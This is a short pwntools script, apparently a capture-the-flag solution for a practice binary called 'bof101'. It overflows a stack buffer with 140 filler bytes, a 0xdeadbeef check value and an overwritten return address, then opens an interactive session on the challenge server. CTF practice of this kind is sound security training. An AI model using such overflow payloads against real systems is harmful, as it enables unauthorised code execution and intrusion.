from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('bof101')
# r= e.process()
r = remote('bof101.sstf.site', 1337)
# lib = e.libc
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

payload = b"a"*140+p32(0xdeadbeef)+b"b"*8+p64(0x4011F6)

r.sendlineafter(b"name?\n",payload)

r.interactive()
